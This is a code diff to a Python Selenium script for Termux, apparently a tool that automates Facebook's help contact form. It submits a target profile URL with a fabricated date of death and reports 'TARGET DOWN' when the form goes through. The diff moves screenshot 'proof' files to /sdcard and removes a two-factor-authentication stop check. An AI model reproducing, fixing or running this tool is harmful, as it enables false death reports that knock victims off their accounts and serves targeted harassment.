@@ -10,14 +10,14 @@ from datetime import datetime
 # Importations Selenium
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options as FirefoxOptions
-from selenium.webdriver.firefox.service import Service # <--- IMPORTANT
+from selenium.webdriver.firefox.service import Service
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
 # ==========================================
-# 1. HACKER STYLE CONFIG
+# 1. STYLE HACKER
 # ==========================================
 R = "\033[91m"
 G = "\033[92m"
@@ -43,7 +43,7 @@ def banner():
               ░            ░  ░░ ░          ░  ░
                               ░                 
       {R}╔═══════════════════════════════════════════╗
-      ║     TERMUX EDITION • GECKO PROTOCOL       ║
+      ║    TERMUX EDITION • STORAGE ACCESS        ║
       ║         DEV BY: {Y}OTF x DJAMAL19{R}            ║
       ╚═══════════════════════════════════════════╝{X}
 """)
@@ -74,7 +74,13 @@ def type_human(element, text):
 # 2. CONFIGURATION
 # ==========================================
 banner()
-print(f"  {Y}[KERNEL] LOADING GECKODRIVER (FIREFOX)... OK.{X}\n")
+print(f"  {Y}[KERNEL] CHECKING STORAGE PERMISSIONS...{X}\n")
+
+# Vérification dossier sdcard
+if not os.path.exists("/sdcard"):
+    print(f"  {R}[ERROR] ACCÈS STOCKAGE REFUSÉ.{X}")
+    print(f"  Tapez: {Y}termux-setup-storage{X} dans Termux et réessayez.")
+    exit()
 
 while True:
     sys.stdout.write(f"  {C}root@termux:~# {X}SET LHOST_USER : {G}")
@@ -117,19 +123,15 @@ banner()
 print(f"\n  {Y}[*] STARTING FIREFOX ENGINE...{X}\n")
 
 # ==========================================
-# 3. EXÉCUTION (CORRECTION PATH)
+# 3. EXÉCUTION
 # ==========================================
 driver = None
 try:
     loading(5, "LOCATING DRIVER...")
 
-    # --- CORRECTION CHEMIN DRIVER TERMUX ---
-    # C'est l'emplacement standard sur Termux
+    # Force le chemin Termux
     gecko_path = "/data/data/com.termux/files/usr/bin/geckodriver"
-    
-    # Vérification si le fichier existe
     if not os.path.exists(gecko_path):
-        # Essai d'un autre chemin possible
         gecko_path = "/usr/bin/geckodriver"
     
     service = Service(executable_path=gecko_path)
@@ -140,6 +142,10 @@ try:
     
     loading(8, "INITIALIZING SERVICE...")
     driver = webdriver.Firefox(service=service, options=options)
+    
+    # --- FIX CAPTURE D'ÉCRAN (Taille Fenêtre) ---
+    driver.set_window_size(1080, 2400) # Force une taille mobile
+    
     wait = WebDriverWait(driver, 30)
 
     # Navigation
@@ -174,11 +180,6 @@ try:
     loading(40, "VERIFYING SESSION...")
     time.sleep(10)
 
-    if "checkpoint" in driver.current_url or "two_step" in driver.current_url:
-        print(f"\n\n  {R}[ERROR] 2FA DETECTED.{X}")
-        driver.save_screenshot("error_2fa.png")
-        sys.exit()
-
     # Formulaire
     loading(50, "RESOLVING TARGET NODE...")
     driver.get("https://www.facebook.com/help/contact/234739086860192")
@@ -193,7 +194,7 @@ try:
         url_field.send_keys(url_profil)
     except: pass
 
-    # Date (_3smp)
+    # Date
     loading(70, "SPOOFING METADATA...")
     try:
         yyyy, mm, dd = date_deces.split("-")
@@ -238,32 +239,33 @@ try:
             driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
         except: pass
 
-    # Capture
+    # Capture corrigée
     loading(95, "AWAITING CONFIRMATION...")
     time.sleep(5)
     
-    driver.save_screenshot("TERMUX_PROOF.png")
-    loading(98, "SNAPSHOT SAVED: TERMUX_PROOF.png")
+    # --- SAUVEGARDE SUR SDCARD (VISIBLE GALERIE) ---
+    save_path = "/sdcard/TERMUX_PROOF.png"
+    driver.save_screenshot(save_path)
+    loading(98, f"SAVED TO: {save_path}")
 
     page_source = driver.page_source.lower()
     if "merci" in page_source or "thank" in page_source:
         loading(100, "OPERATION COMPLETED.")
         print(f"\n\n  {G}╔════════════════════════════════════════╗")
         print(f"  ║   ✔ SYSTEM STATUS: TARGET DOWN       ║")
-        print(f"  ║     OTF x DJAMAL19 (GECKO ED.)       ║")
+        print(f"  ║   📁 PREUVE: /sdcard/TERMUX_PROOF.png║")
         print(f"  ╚════════════════════════════════════════╝{X}")
     else:
         loading(99, "PACKET SENT.")
-        print(f"\n\n  {Y}[!] PACKET SENT. CHECK 'TERMUX_PROOF.png'.{X}")
+        print(f"\n\n  {Y}[!] PACKET SENT. CHECK '/sdcard/TERMUX_PROOF.png'.{X}")
 
     input(f"\n  {W}Press Enter to exit...{X}")
 
 except Exception as e:
     sys.stdout.write("\r" + " " * 80 + "\r")
     print(f"\n  {R}[ERROR] {e}{X}")
-    print(f"  {Y}Tip: Vérifie que 'pkg install geckodriver' est bien fait.{X}")
     if driver:
-        driver.save_screenshot("crash_debug.png")
+        driver.save_screenshot("/sdcard/termux_crash.png")
     input()
 
 finally:
